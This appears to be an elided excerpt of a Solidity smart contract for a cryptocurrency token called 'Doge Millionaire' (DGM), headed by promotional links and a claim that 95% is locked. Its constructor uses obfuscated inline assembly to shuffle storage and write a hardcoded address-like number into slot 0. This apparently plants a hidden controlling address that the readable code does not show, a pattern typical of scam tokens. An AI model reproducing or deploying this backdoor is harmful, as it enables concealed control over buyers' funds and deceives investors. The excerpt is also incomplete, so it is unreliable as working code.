/*
Welcome to Doge Millionaire Metaverse.

Telegram: https://t.me/DogeMillionaire/
Twitter: https://twitter.com/DogeMillionaire/
Website: https://DogeMillionaire.finance
95% - LOCKED
...
contract DogeMillionaire {
    string public constant name = "Doge Millionaire";
    string public constant symbol = "DGM";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1009724252342139535081527364905410316150995986354, 4))}
